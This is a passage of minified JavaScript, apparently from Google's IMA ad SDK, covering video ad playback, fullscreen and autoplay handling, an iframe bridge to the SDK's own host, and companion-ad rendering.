                yB(c) ? d(c) : e()
            })
        });
        xB(c, a);
        return b
    };
    var AB = function(a, b) {
        M.call(this);
        this.h = yB(a);
        this.g = b
    };
    t(AB, M);
    var CB = function(a) {
            try {
                a.h.registerSessionObserver(function(b) {
                    "sessionStart" == b.type ? BB(a, a.g) : "sessionFinish" == b.type && CB(a)
                })
            } catch (b) {
                a.dispatchEvent(new Event("error"))
            }
        },
        BB = function(a, b) {
            try {
                a.h.setVideoElement(b)
            } catch (c) {
                a.dispatchEvent(new Event("error"))
            }
        };
    var DB = function(a) {
        this.g = a
    };
    DB.prototype.getCuePoints = function() {
        return this.g
    };
    DB.prototype.getCuePoints = DB.prototype.getCuePoints;
    y("module$contents$ima$AdCuePoints_AdCuePoints.PREROLL", 0, void 0);
    y("module$contents$ima$AdCuePoints_AdCuePoints.POSTROLL", -1, void 0);
    var EB = function(a) {
            this.g = a;
            this.l = "";
            this.h = -1;
            this.o = !1
        },
        GB = function(a, b) {
            if (0 <= a.h) {
                var c = null == b ? function() {} : b,
                    d = function() {
                        FB(a, c);
                        a.g.removeEventListener("loadedmetadata", d, !1)
                    };
                a.g.addEventListener("loadedmetadata", d, !1);
                a.g.src = a.l;
                a.g.load()
            } else null != b && b()
        },
        FB = function(a, b) {
            var c = 0 < a.g.seekable.length;
            a.o ? c ? (a.g.currentTime = a.h, HB(a), b()) : setTimeout(function() {
                return FB(a, b)
            }, 100) : (HB(a), b())
        },
        HB = function(a) {
            a.h = -1;
            a.l = "";
            a.o = !1
        };
    var IB = function(a) {
            return 5 < a.width && 5 < a.height
        },
        JB = function(a) {
            M.call(this);
            this.g = a;
            this.aa = null;
            this.D = new EB(a);
            this.h = new yu(this);
            Vi(this, this.h);
            this.C = 0;
            this.M = this.H = this.T = this.$ = this.K = !1;
            this.R = this.o = null;
            this.l = new lf(this.g.offsetWidth, this.g.offsetHeight);
            this.A = null;
            this.X = qA(this.g);
            this.Y = !1
        };
    t(JB, M);
    l = JB.prototype;
    l.gd = function() {
        var a = this.D;
        a.l = a.g.currentSrc;
        a.o = 0 < a.g.seekable.length;
        a.h = a.g.ended ? -1 : a.g.currentTime
    };
    l.Nb = function(a) {
        GB(this.D, a)
    };
    l.load = function(a, b) {
        var c = J().g;
        c.T = !0;
        nh(c);
        Ch("hvd_lc");
        KB(this);
        this.T = !1;
        if (b)
            if (Ch("hvd_ad"), b instanceof yt) {
                if (Ch("hvd_mad"), c = b.getMediaUrl()) {
                    Ch("hvd_admu");
                    Ch("hvd_src");
                    this.g.src = c;
                    this.g.load();
                    return
                }
            } else if (b instanceof xt) {
            Ch("hvd_dad");
            c = b.I;
            var d = b.l,
                e = b.C,
                f = b.h,
                g = b.A,
                h = b.g;
            if (c && d && e && f && g && h && (Ch("hvd_addu"), b.B)) {
                Ch("hvd_admse");
                b = e + '; codecs="' + g + '"';
                f = f + '; codecs="' + h + '"';
                if (tw() && tw() && MediaSource.isTypeSupported(b) && tw() && MediaSource.isTypeSupported(f)) {
                    Ch("hvd_ymse");
                    Ch("hvd_mse");
                    a = !1;
                    try {
                        -1 != window.location.search.indexOf("goog_limavideo=true") && (a = !0)
                    } catch (k) {}
                    u.customElements ? a ? a = !0 : (Sh(Mi) && eA().report(153, {
                        limvid: "vd"
                    }), a = Sh(Mi) || Sh(Ki) || Sh(Ii) || Sh(Ji) ? !0 : !1) : a = !1;
                    a ? (this.g.pb = c, this.g.Bb = d) : (this.aa = new Hx(this.g, [new ww(c, b, 35E4, new cv), new ww(d, f, 82E3, new cv)]), Vi(this, this.aa), a = this.g, c = this.aa, c.g || (c.g = window.URL.createObjectURL(c.ca)), c = c.g, a.src = c);
                    this.g.load();
                    return
                }
                Ch("hvd_nmse")
            }
        } else Ch("hvd_uad");
        a ? (Ch("hvd_src"), this.g.src = a) : Ch("hvd_vn");
        this.g.load()
    };
    l.setVolume = function(a) {
        this.g.volume = Math.max(a, 0);
        this.g.muted = 0 == a ? !0 : !1
    };
    l.getVolume = function() {
        return this.g.muted ? 0 : this.g.volume
    };
    var LB = function(a) {
        a.Y = !1;
        a.T || Ic() ? (a.M = !1, a.o = a.g.play(), null != a.o && (a.R = null, a.o.then(function() {
            a.o = null;
            a.Fd(a.R);
            a.R = null
        }).catch(function(b) {
            a.o = null;
            var c = "";
            null != b && null != b.name && (c = b.name);
            "AbortError" == c || "NotAllowedError" == c ? a.dispatchEvent("autoplayDisallowed") : a.da()
        }))) : a.M = !0
    };
    JB.prototype.pause = function() {
        null == this.o && (this.Y = !0, this.g.pause())
    };
    JB.prototype.getDuration = function() {
        return isNaN(this.g.duration) ? -1 : this.g.duration
    };
    JB.prototype.N = function() {
        this.A && (this.g instanceof HTMLElement && this.A.unobserve(this.g), this.A = null);
        MB(this);
        M.prototype.N.call(this)
    };
    var MB = function(a) {
            null != a.G && (Gz(a.G), a.G = null);
            null != a.V && a.V.W();
            Cu(a.h);
            KB(a)
        },
        KB = function(a) {
            a.$ = !1;
            a.H = !1;
            a.K = !1;
            a.M = !1;
            a.C = 0;
            a.o = null;
            a.R = null;
            Ti(a.J)
        };
    JB.prototype.nb = function(a) {
        this.dispatchEvent(a.type)
    };
    var OB = function(a) {
        if (!a.H) {
            a.H = !0;
            a.dispatchEvent("start");
            try {
                if (Sh(Mi) && u.customElements) {
                    var b = u.customElements.get("lima-video");
                    a.g instanceof b ? eA().report(153, {
                        limvid: "limastart"
                    }) : eA().report(153, {
                        limvid: "videostart"
                    })
                }
            } catch (d) {
                eA().report(153, {
                    limvid: "startfail"
                })
            }
            b = "function" === typeof a.g.getAttribute && null != a.g.getAttribute("playsinline");
            b = void 0 === b ? !1 : b;
            var c;
            if (!(c = !(Dd || pu()) && !qu(10))) {
                if (b = !b) G(jy), b = !1;
                c = b
            }
            c ? (G(jy), (b = sc(Fc, "Xbox")) || (Cd || Ed ? b = 0 : !Bd || Bd && ou(nu, 4) ? Mm() ? (G(jy),
                b = !1) : b = !my() : b = 0)) : b = 1;
            b || !Bd || Bd && ou(nu, 3) || (Cd || Ed) && !qu(4) || NB(a)
        }
    };
    l = JB.prototype;
    l.$e = function() {
        this.T = !0;
        this.M && LB(this);
        this.M = !1;
        I(J(), "irve", this.g instanceof HTMLElement ? "1" : "0");
        if (IB(this.l)) {
            var a = this.l;
            I(J(), "ps", a.width + "x" + a.height)
        } else I(J(), "psnvoc", "1"), PB(this)
    };
    l.af = function() {
        this.$ || (this.$ = !0, this.dispatchEvent("loaded"))
    };
    l.Fd = function(a) {
        null != this.o ? this.R = a : (this.dispatchEvent("play"), Fd || Dd || pu() || Td || OB(this))
    };
    l.df = function(a) {
        if (!this.H && (Fd || Dd || pu() || Td)) {
            if (0 >= this.g.currentTime) return;
            if (Td && this.g.ended && 1 == this.getDuration()) {
                this.da(a);
                return
            }
            OB(this)
        }
        if (Fd || sc(Fc, "Nintendo WiiU")) {
            if (1.5 < this.g.currentTime - this.C) {
                this.K = !0;
                this.g.currentTime = this.C;
                return
            }
            this.K = !1;
            this.g.currentTime > this.C && (this.C = this.g.currentTime)
        }
        this.dispatchEvent("timeUpdate")
    };
    l.ff = function() {
        this.dispatchEvent("volumeChange")
    };
    l.cf = function() {
        if (this.H && Fd && !this.Y && (2 > QB(this) || this.K)) {
            this.J = new bk(250);
            this.h.O(this.J, "tick", this.kb);
            this.J.start();
            var a = !0
        } else a = !1;
        a || this.o || this.dispatchEvent("pause")
    };
    l.Ze = function() {
        var a = !0;
        if (Fd || sc(Fc, "Nintendo WiiU")) a = this.C >= this.g.duration - 1.5;
        !this.K && a && this.dispatchEvent("end")
    };
    var NB = function(a) {
        a.dispatchEvent("beginFullscreen")
    };
    JB.prototype.ua = function() {
        this.dispatchEvent("endFullscreen")
    };
    JB.prototype.da = function() {
        this.dispatchEvent("error")
    };
    JB.prototype.Va = function() {
        this.dispatchEvent("click")
    };
    var PB = function(a) {
        "ResizeObserver" in window ? (a.A = new ResizeObserver(function(b) {
            b = q(b);
            for (var c = b.next(); !c.done; c = b.next()) c = c.value, c.contentBoxSize ? (c = Array.isArray(c.contentBoxSize) ? c.contentBoxSize[0] : c.contentBoxSize, a.l.width = Math.floor(c.inlineSize), a.l.height = Math.floor(c.blockSize)) : (a.l.width = Math.floor(c.contentRect.width), a.l.height = Math.floor(c.contentRect.height)), IB(a.l) && (a.g instanceof HTMLElement && a.A.unobserve(a.g), a.A = null, c = a.l, I(J(), "ps", c.width + "x" + c.height))
        }), a.g instanceof HTMLElement && a.A.observe(a.g)) : I(J(), "rons", "1")
    };
    JB.prototype.ib = function() {
        var a = new lf(this.g.offsetWidth, this.g.offsetHeight),
            b = qA(this.g);
        if (a.width != this.l.width || a.height != this.l.height) !this.X && b ? NB(this) : this.X && !b && this.ua(), this.l = a, this.X = b
    };
    JB.prototype.kb = function() {
        if (!this.g.ended && this.g.paused && (Fd || Ud ? this.g.currentTime < this.g.duration : 1)) {
            var a = this.g.duration - this.g.currentTime,
                b = QB(this);
            0 < b && (2 <= b || 2 > a) && (Ti(this.J), LB(this))
        } else Ti(this.J)
    };
    var QB = function(a) {
        var b;
        a: {
            for (b = a.g.buffered.length - 1; 0 <= b;) {
                if (a.g.buffered.start(b) <= a.g.currentTime) {
                    b = a.g.buffered.end(b);
                    break a
                }
                b--
            }
            b = 0
        }
        return b - a.g.currentTime
    };
    JB.prototype.Pb = function() {
        eA().report(139);
        NB(this)
    };
    var UB = function(a, b, c) {
        L.call(this);
        var d = this;
        this.l = b;
        this.o = c;
        b = new yu(this);
        Vi(this, b);
        this.B = "goog_" + $c++;
        this.g = this.h = null;
        zB(a, this.B).then(function(e) {
            return void RB(d, e)
        }).catch(function() {
            return void SB(d)
        });
        b.O(this.l, "adsManager", function(e) {
            "allAdsCompleted" == e.ha && TB(d)
        })
    };
    t(UB, L);
    var RB = function(a, b) {
            a.h = b;
            var c = {};
            c = (c.frameName = a.B, c);
            Dy(a.l, "omid", "iframeReady", c);
            a.g = new AB(b, a.o);
            a.g.O("error", function() {
                return void SB(a)
            });
            CB(a.g)
        },
        SB = function(a) {
            Dy(a.l, "omid", "iframeFailed");
            a.W()
        },
        TB = function(a) {
            setTimeout(function() {
                a.W()
            }, 3E3)
        };
    UB.prototype.N = function() {
        this.h && (yf(this.h), this.h = null);
        L.prototype.N.call(this)
    };
    var VB = function(a, b, c, d) {
        L.call(this);
        this.o = a;
        this.l = b;
        this.g = c;
        this.C = d;
        this.h = new yu(this);
        Vi(this, this.h);
        this.h.O(this.o, d, this.A)
    };
    t(VB, L);
    var XB = function(a, b) {
        var c = b.la;
        switch (b.ha) {
            case "showVideo":
                c = a.l;
                null != c.h && c.h.show();
                break;
            case "hide":
                c = a.l;
                null != c.h && WB(c.h.g, !1);
                break;
            case "resizeAndPositionVideo":
                a = a.l.g;
                c = c.resizeAndPositionVideo;
                a.g.style.left = String(c.left) + "px";
                a.g.style.top = String(c.top) + "px";
                a.g.style.width = String(c.width) + "px";
                a.g.style.height = String(c.height) + "px";
                break;
            case "restoreSizeAndPositionVideo":
                c = a.l.g, c.g.style.width = "100%", c.g.style.height = "100%", c.g.style.left = "0", c.g.style.right = "0"
        }
    };
    VB.prototype.A = function(a) {
        var b = a.la;
        switch (a.ha) {
            case "activate":
                a = this.l;
                var c = this.g;
                a.g != c && a.h && a.o && a.l && (c.setVolume(a.g.getVolume()), c = a.g, a.g = a.l, a.l = c, c = a.h, a.h = a.o, a.o = c, WB(a.o.g, !1), null != (c = a.I.G) && (a = a.g.D.g, c.o = a, c.g && (c = c.g, c.g = a, BB(c, a))));
                break;
            case "startTracking":
                a = this.g;
                c = this.B;
                this.h.O(a, Mb(Zu), c);
                this.h.O(a, ly, c);
                a = this.g;
                MB(a);
                a.h.O(a.g, ly, a.nb);
                a.h.O(a.g, "ended", a.Ze);
                a.h.O(a.g, "webkitbeginfullscreen", a.Pb);
                a.h.O(a.g, "webkitendfullscreen", a.ua);
                a.h.O(a.g, "loadedmetadata",
                    a.$e);
                a.h.O(a.g, "pause", a.cf);
                a.h.O(a.g, "playing", a.Fd);
                a.h.O(a.g, "timeupdate", a.df);
                a.h.O(a.g, "volumechange", a.ff);
                a.h.O(a.g, "error", a.da);
                a.h.O(a.g, Td || Fd && !qu(8) ? "loadeddata" : "canplay", a.af);
                a.G = new Cz;
                a.h.O(a.G, "click", a.Va);
                Ez(a.G, a.g);
                a.V = new bk(1E3);
                a.h.O(a.V, "tick", a.ib);
                a.V.start();
                break;
            case "stopTracking":
                a = this.g;
                c = this.B;
                this.h.Ua(a, Mb(Zu), c);
                this.h.Ua(a, ly, c);
                MB(this.g);
                break;
            case "exitFullscreen":
                a = this.g;
                (Cd || Ed) && a.g.webkitDisplayingFullscreen && a.g.webkitExitFullscreen();
                break;
            case "play":
                LB(this.g);
                break;
            case "pause":
                this.g.pause();
                break;
            case "load":
                a = this.g;
                c = b.videoUrl;
                var d = b.muxedMediaUrl,
                    e = b.muxedMimeType,
                    f = b.muxedAudioCodec,
                    g = b.muxedVideoCodec,
                    h = b.demuxedAudioUrl,
                    k = b.demuxedVideoUrl,
                    n = b.demuxedAudioMimeType,
                    m = b.demuxedVideoMimeType,
                    v = b.demuxedAudioCodec,
                    r = b.demuxedVideoCodec;
                b = b.mseCompatible;
                var w = null;
                k && h && b && m && n && r && v && (w = new xt({
                    uf: k,
                    re: h,
                    Bh: null,
                    sh: null,
                    tf: m,
                    qe: n,
                    vb: r,
                    ob: v,
                    height: null,
                    width: null,
                    Ia: b,
                    Ah: null,
                    rh: null
                }));
                h = null;
                d && e && g && f && (h = new yt({
                    Ye: d,
                    wh: null,
                    mimeType: e,
                    vb: g,
                    ob: f,
                    height: null,
                    width: null,
                    Ia: b,
                    uh: null
                }));
                w ? a.load(c, w) : h ? a.load(c, h) : a.load(c, null);
                break;
            case "unload":
                a = this.g;
                KB(a);
                a.T = !1;
                "removeAttribute" in a.g ? a.g.removeAttribute("src") : a.g.src = "";
                a.g.load();
                break;
            case "setCurrentTime":
                this.g.g.currentTime = b.currentTime;
                break;
            case "setVolume":
                this.g.setVolume(b.volume)
        }
    };
    VB.prototype.B = function(a) {
        var b = {};
        switch (a.type) {
            case "autoplayDisallowed":
                a = "autoplayDisallowed";
                break;
            case "beginFullscreen":
                a = "fullscreen";
                break;
            case "endFullscreen":
                a = "exitFullscreen";
                break;
            case "click":
                a = "click";
                break;
            case "end":
                a = "end";
                break;
            case "error":
                a = "error";
                break;
            case "loaded":
                a = "loaded";
                break;
            case "mediaLoadTimeout":
                a = "mediaLoadTimeout";
                break;
            case "pause":
                a = "pause";
                b.ended = this.g.g.ended;
                break;
            case "play":
                a = "play";
                break;
            case "skip":
                a = "skip";
                break;
            case "start":
                a = "start";
                b.volume = this.g.getVolume();
                break;
            case "timeUpdate":
                a = "timeupdate";
                b.currentTime = this.g.g.currentTime;
                b.duration = this.g.getDuration();
                break;
            case "volumeChange":
                a = "volumeChange";
                b.volume = this.g.getVolume();
                break;
            case "loadedmetadata":
                a = a.type;
                b.duration = this.g.getDuration();
                break;
            case "abort":
            case "canplay":
            case "canplaythrough":
            case "durationchange":
            case "emptied":
            case "loadstart":
            case "loadeddata":
            case "progress":
            case "ratechange":
            case "seeked":
            case "seeking":
            case "stalled":
            case "suspend":
            case "waiting":
                a = a.type;
                break;
            default:
                return
        }
        Dy(this.o,
            this.C, a, b)
    };
    var YB = function(a, b) {
        L.call(this);
        this.h = b;
        this.l = new VB(a, b, this.h.g, "videoDisplay1");
        Vi(this, this.l);
        this.g = null;
        var c = this.h.l;
        null != c && (this.g = new VB(a, b, c, "videoDisplay2"), Vi(this, this.g))
    };
    t(YB, L);
    var ZB = function(a, b, c, d) {
        var e = vf(document, "IFRAME");
        e.id = b;
        e.name = b;
        e.width = String(c);
        e.height = String(d);
        e.allowTransparency = "true";
        e.scrolling = "no";
        e.marginWidth = "0";
        e.marginHeight = "0";
        e.frameBorder = "0";
        e.style.border = "0";
        e.style.verticalAlign = "bottom";
        e.src = "about:blank";
        Kg(Cg) && (e.setAttribute("role", "region"), e.setAttribute("aria-label", "Advertisement"), e.title = "3rd party ad content", e.tabIndex = 0);
        a.appendChild(e);
        return e
    };

    function $B() {
        var a, b;
        return null == (a = E().googletag) ? void 0 : null == (b = a.companionAds) ? void 0 : b.call(a)
    }

    function aC(a) {
        var b = {};
        b.slotId = a.getSlotId().getId();
        var c = [];
        a = q(a.getSizes() || []);
        for (var d = a.next(); !d.done; d = a.next())
            if (d = d.value, "string" !== typeof d) {
                var e = {};
                c.push((e.adWidth = d.getWidth(), e.adHeight = d.getHeight(), e))
            }
        return b.adSizes = c, b
    }

    function bC(a) {
        var b = $B();
        if (b && a && Array.isArray(a)) {
            var c = new Map(b.getSlots().map(function(r) {
                return [r.getSlotId().getId(), r]
            }));
            a = q(a);
            for (var d = a.next(); !d.done; d = a.next()) {
                var e = d.value,
                    f = c.get(e.slotId);
                if (f && !b.isSlotAPersistentRoadblock(f)) {
                    var g = e.adContent;
                    if (g && (d = pf(f.getSlotId().getDomId()))) {
                        d.style.display = "";
                        var h = e.adWidth,
                            k = e.adHeight;
                        d.textContent = "";
                        if (e.friendlyIframeRendering) try {
                            var n = "google_companion_" + f.getSlotId().getId(),
                                m = ZB(d, n, h, k),
                                v = m.contentWindow ? m.contentWindow.document :
                                m.contentDocument;
                            xd && v.open("text/html", "replace");
                            Tc(v, vu(g));
                            v.close()
                        } catch (r) {} else Sc(d, vu(g)), d.style.width = h + "px", d.style.height = k + "px";
                        b.slotRenderEnded(f, h, k);
                        (e = e.onAdContentSet) && e(d)
                    }
                }
            }
        }
    };
    var cC = function(a, b, c, d, e, f) {
        fA.call(this, a, b, c, d, e);
        this.g = f
    };
    t(cC, fA);
    var dC = function(a, b) {
        M.call(this);
        this.o = a;
        this.l = b;
        this.g = {};
        this.h = new yu(this);
        Vi(this, this.h);
        this.h.O(E(), "message", this.A)
    };
    t(dC, M);
    var eC = function(a, b) {
            var c = b.g;
            a.g.hasOwnProperty(c) && Dy(a.g[c], b.type, b.ha, b.la)
        },
        fC = function(a, b, c, d) {
            a.g.hasOwnProperty(b) || (c = new IA(b, c), a.h.O(c, a.o, function(e) {
                this.dispatchEvent(new cC(e.type, e.ha, e.la, e.Mb, e.Gd, b))
            }), c.g = d, c.connect(), a.g[b] = c)
        };
    dC.prototype.N = function() {
        for (var a in this.g) Ti(this.g[a]);
        M.prototype.N.call(this)
    };
    dC.prototype.A = function(a) {
        a = a.g;
        var b = JA(a.data);
        if (null != b) {
            var c = b.channel;
            if (this.l && !this.g.hasOwnProperty(c)) {
                var d = b.sid;
                fC(this, c, d, a.source);
                this.dispatchEvent(new cC(b.name, b.type, b.data || {}, d, a.origin, c))
            }
        }
    };

    function gC() {
        return !!Ka("googletag.cmd", E())
    }

    function hC() {
        var a = Ka("googletag.console", E());
        return null != a ? a : null
    }
    var iC = function() {
        yu.call(this);
        this.l = new dC("gpt", !0);
        Vi(this, this.l);
        this.O(this.l, "gpt", this.A);
        this.g = null;
        gC() || E().top === E() || (this.g = new dC("gpt", !1), Vi(this, this.g), this.O(this.g, "gpt", this.B))
    };
    t(iC, yu);
    iC.prototype.A = function(a) {
        var b = a.Gd,
            c = "//imasdk.googleapis.com".match(Ff);
        b = b.match(Ff);
        if (c[3] == b[3] && c[4] == b[4])
            if (null != this.g) fC(this.g, a.g, a.Mb, E().parent), null != this.g && eC(this.g, a);
            else if (c = a.la, null != c && void 0 !== c.scope) {
            b = c.scope;
            c = c.args;
            var d;
            if ("proxy" == b) {
                var e = a.ha;
                "isGptPresent" == e ? d = gC() : "isConsolePresent" == e && (d = null != hC())
            } else if (gC())
                if ("pubads" == b || "companionAds" == b) {
                    d = a.ha;
                    var f = E().googletag;
                    if (null != f && null != f[b] && (b = f[b](), null != b && (d = b[d], null != d))) try {
                        e = d.apply(b, c)
                    } catch (g) {}
                    d =
                        e
                } else if ("console" == b) {
                if (e = hC(), null != e && (b = e[a.ha], null != b)) try {
                    b.apply(e, c)
                } catch (g) {}
            } else null === b && (e = a.ha, "googleGetCompanionAdSlots" == e ? (e = $B()) ? (e = e.getSlots().map(aC), d = e.length ? e : null) : d = null : ("googleSetCompanionAdContents" == e && bC(c[0]), d = null));
            void 0 !== d && (a.la.returnValue = d, eC(this.l, a))
        }
    };
    iC.prototype.B = function(a) {
        eC(this.l, a)
    };
    var jC = function(a, b) {
        if (a.g) {
            var c = a.g;
            Ti(c.g[b]);
            delete c.g[b]
        }
        a.l && (a = a.l, Ti(a.g[b]), delete a.g[b])
    };
    var lC = function(a, b) {
            var c = Array.prototype.slice.call(arguments),
                d = c.shift();
            if ("undefined" == typeof d) throw Error("[goog.string.format] Template required");
            return d.replace(/%([0\- \+]*)(\d+)?(\.(\d+))?([%sfdiu])/g, function(e, f, g, h, k, n, m, v) {
                if ("%" == n) return "%";
                var r = c.shift();
                if ("undefined" == typeof r) throw Error("[goog.string.format] Not enough arguments");
                arguments[0] = r;
                return kC[n].apply(null, arguments)
            })
        },
        kC = {
            s: function(a, b, c) {
                return isNaN(c) || "" == c || a.length >= Number(c) ? a : a = -1 < b.indexOf("-", 0) ?
                    a + Yc(" ", Number(c) - a.length) : Yc(" ", Number(c) - a.length) + a
            },
            f: function(a, b, c, d, e) {
                d = a.toString();
                isNaN(e) || "" == e || (d = parseFloat(a).toFixed(e));
                var f = 0 > Number(a) ? "-" : 0 <= b.indexOf("+") ? "+" : 0 <= b.indexOf(" ") ? " " : "";
                0 <= Number(a) && (d = f + d);
                if (isNaN(c) || d.length >= Number(c)) return d;
                d = isNaN(e) ? Math.abs(Number(a)).toString() : Math.abs(Number(a)).toFixed(e);
                a = Number(c) - d.length - f.length;
                return d = 0 <= b.indexOf("-", 0) ? f + d + Yc(" ", a) : f + Yc(0 <= b.indexOf("0", 0) ? "0" : " ", a) + d
            },
            d: function(a, b, c, d, e, f, g, h) {
                return kC.f(parseInt(a,
                    10), b, c, d, 0, f, g, h)
            }
        };
    kC.i = kC.d;
    kC.u = kC.d;
    var nC = function(a, b) {
        M.call(this);
        this.l = new yu(this);
        Vi(this, this.l);
        this.K = this.J = null;
        this.H = !1;
        this.D = "goog_" + $c++;
        this.A = new Map;
        var c = this.D,
            d = (Rf() ? "https:" : "http:") + lC("//imasdk.googleapis.com/js/core/bridge3.479.1_%s.html", W.o);
        a: {
            var e = window;
            try {
                do {
                    try {
                        if (0 == e.location.href.indexOf(d) || 0 == e.document.referrer.indexOf(d)) {
                            var f = !0;
                            break a
                        }
                    } catch (g) {}
                    e = e.parent
                } while (e != e.top)
            } catch (g) {}
            f = !1
        }
        f && (d += "?f=" + c);
        c = xf("IFRAME", {
            src: d + "#" + c,
            allowFullscreen: !0,
            allow: "autoplay;trust-token-redemption",
            style: "border:0; opacity:0; margin:0; padding:0; position:relative; color-scheme: light;"
        });
        this.l.Gb(c, "load", this.Y);
        a.appendChild(c);
        this.g = c;
        this.o = mC(this);
        this.C = b;
        this.h = null;
        this.M = new YB(this.o, this.C);
        Vi(this, this.M);
        this.C.g && this.l.O(this.o, "displayContainer", this.T);
        this.l.O(this.o, "mouse", this.V);
        this.l.O(this.o, "touch", this.X);
        c = E();
        d = Ka("google.ima.gptProxyInstance", c);
        null != d ? c = d : (d = new iC, y("google.ima.gptProxyInstance", d, c), c = d);
        this.R = c;
        my() || (this.G = new UB(a, this.o, b.g.D.g), Vi(this,
            this.G))
    };
    t(nC, M);
    var mC = function(a, b) {
        b = void 0 === b ? "*" : b;
        var c = a.A.get(b);
        null == c && (c = new IA(a.D, b), a.H && (c.g = Bf(a.g), c.connect()), a.A.set(b, c));
        return c
    };
    nC.prototype.N = function() {
        null !== this.h && (this.h.W(), this.h = null);
        this.A.forEach(function(a) {
            Ti(a)
        });
        this.A.clear();
        jC(this.R, this.D);
        yf(this.g);
        M.prototype.N.call(this)
    };
    nC.prototype.V = function(a) {
        var b = a.la,
            c = mg(this.g),
            d = document.createEvent("MouseEvent");
        d.initMouseEvent(a.ha, !0, !0, window, b.detail, b.screenX, b.screenY, b.clientX + c.x, b.clientY + c.y, b.ctrlKey, b.altKey, b.shiftKey, b.metaKey, b.button, null);
        this.g.dispatchEvent(d)
    };
    var oC = function(a, b) {
        var c = mg(a.g),
            d = !!("TouchEvent" in window && 0 < TouchEvent.length);
        b = b.map(function(e) {
            return d ? new Touch({
                identifier: e.identifier,
                target: a.g,
                clientX: e.clientX,
                clientY: e.clientY,
                screenX: e.screenX,
                screenY: e.screenY,
                pageX: e.pageX + c.x,
                pageY: e.pageY + c.y
            }) : document.createTouch(window, a.g, e.identifier, e.pageX + c.x, e.pageY + c.y, e.screenX, e.screenY)
        });
        return d ? b : document.createTouchList.apply(document, b)
    };
    nC.prototype.X = function(a) {
        var b = a.la,
            c = mg(this.g);
        if ("TouchEvent" in window && 0 < TouchEvent.length) b = {
            bubbles: !0,
            cancelable: !0,
            view: window,
            detail: b.detail,
            ctrlKey: b.ctrlKey,
            altKey: b.altKey,
            shiftKey: b.shiftKey,
            metaKey: b.metaKey,
            touches: oC(this, b.touches),
            targetTouches: oC(this, b.targetTouches),
            changedTouches: oC(this, b.changedTouches)
        }, a = new TouchEvent(a.ha, b), this.g.dispatchEvent(a);
        else {
            var d = document.createEvent("TouchEvent");
            d.initTouchEvent(a.ha, !0, !0, window, b.detail, b.screenX, b.screenY, b.clientX +
                c.x, b.clientY + c.y, b.ctrlKey, b.altKey, b.shiftKey, b.metaKey, oC(this, b.touches), oC(this, b.targetTouches), oC(this, b.changedTouches), b.scale, b.rotation);
            this.g.dispatchEvent(d)
        }
    };
    nC.prototype.T = function(a) {
        switch (a.ha) {
            case "showVideo":
                null == this.h ? (this.h = new Cz, this.l.O(this.h, "click", this.$)) : Gz(this.h);
                Ez(this.h, pC(this.C));
                break;
            case "hide":
                null !== this.h && (this.h.W(), this.h = null)
        }
        var b = this.M;
        XB(b.l, a);
        b.g && XB(b.g, a)
    };
    nC.prototype.$ = function() {
        Dy(this.o, "displayContainer", "videoClick")
    };
    nC.prototype.Y = function() {
        var a = this;
        this.J = $g();
        this.K = Xg();
        this.A.forEach(function(b) {
            b.g = Bf(a.g);
            b.connect()
        });
        this.H = !0
    };
    var rC = function() {
        M.call(this);
        this.buffered = new qC;
        this.D = new qC;
        this.A = new yu(this);
        Vi(this, this.A);
        this.src = this.C = "";
        this.G = !1;
        this.l = null;
        var a = Rx(W);
        if (a) {
            a: {
                if (Pb(a.g, "videoElementFakeDuration") && (a = a.g.videoElementFakeDuration, "number" === typeof a)) break a;a = NaN
            }
            this.duration = a
        }
    };
    t(rC, M);
    var sC = function() {
        var a = ["video/mp4"],
            b = ["video/ogg"],
            c = new rC;
        c.canPlayType = function(d) {
            return a.includes(d) ? "probably" : b.includes(d) ? "maybe" : ""
        };
        c.width = 0;
        c.height = 0;
        c.offsetWidth = 0;
        c.offsetHeight = 0;
        return c
    };
    l = rC.prototype;
    l.pause = function() {
        this.paused || (null.stop(), this.paused = !0, this.dispatchEvent("timeupdate"), this.dispatchEvent("pause"))
    };
    l.load = function() {
        this.hd = 0;
        this.paused = !0;
        this.dispatchEvent("loadstart");
        var a;
        isNaN(this.duration) ? a = 10 + 20 * Math.random() : a = this.duration;
        this.setProperty("duration", a);
        a = this.D;
        a.g.push(new tC(this.duration));
        a.length = a.g.length;
        a = this.buffered;
        a.g.push(new tC(this.duration));
        a.length = a.g.length;
        this.dispatchEvent("loadedmetadata");
        0 < this.currentTime && this.dispatchEvent("timeupdate");
        this.dispatchEvent("loadeddata");
        this.dispatchEvent("canplay");
        this.dispatchEvent("canplaythrough");
        this.dispatchEvent("progress")
    };
    l.setProperty = function(a, b) {
        switch (a) {
            case "currentTime":
                a = Number(b);
                this.dispatchEvent("seeking");
                this.currentTime = a;
                this.dispatchEvent("seeked");
                a = Ya() - this.o;
                b = this.currentTime + a / 1E3;
                this.o += a;
                2 < this.hd && (this.currentTime = Math.min(b, this.duration));
                this.dispatchEvent("timeupdate");
                this.currentTime == this.duration && (this.paused = !0, null.stop(), this.dispatchEvent("ended"));
                break;
            case "duration":
                this.duration = Number(b);
                this.dispatchEvent("durationchange");
                break;
            case "volume":
                this.volume = Number(b);
                this.dispatchEvent("volumechange");
                break;
            default:
                throw "Property setter not implemented";
        }
    };
    l.setAttribute = function(a, b) {
        null != a && uC.set(a, b)
    };
    l.getAttribute = function(a) {
        return uC.get(a)
    };
    l.Zd = function(a) {
        var b = null,
            c = null;
        switch (a.type) {
            case "loadeddata":
                b = "Loaded";
                break;
            case "playing":
                b = "Playing";
                c = "#00f";
                break;
            case "pause":
                b = "Paused";
                break;
            case "ended":
                b = "Ended", c = "#000"
        }
        b && this.h && (this.h.innerText = b);
        c && this.g && (this.g.style.backgroundColor = c)
    };
    var uC = new Ls,
        tC = function(a) {
            this.startTime = 0;
            this.endTime = a
        },
        qC = function() {
            this.length = 0;
            this.g = []
        };
    qC.prototype.start = function(a) {
        return this.g[a].startTime
    };
    qC.prototype.end = function(a) {
        return this.g[a].endTime
    };
    l = rC.prototype;
    l.hd = 0;
    l.currentTime = 0;
    l.duration = NaN;
    l.paused = !0;
    l.volume = 1;
    l.muted = !1;
    Object.defineProperty(rC.prototype, "src", {
        get: function() {
            return rC.prototype.C
        },
        set: function(a) {
            var b = rC.prototype;
            b.G && null != b.l ? (b.l.reject(), b.l = null) : b.C = a
        }
    });
    rC.prototype.o = 0;
    rC.prototype.g = null;
    rC.prototype.h = null;
    var xC = function(a, b) {
        L.call(this);
        this.o = a;
        this.l = this.g = null;
        this.h = vC();
        wC(this, b);
        Yw(function() {
            I(J(), "haob", "1")
        })
    };
    t(xC, L);
    xC.prototype.initialize = function() {
        this.h && this.h.load()
    };
    xC.prototype.N = function() {
        yf(this.g);
        L.prototype.N.call(this)
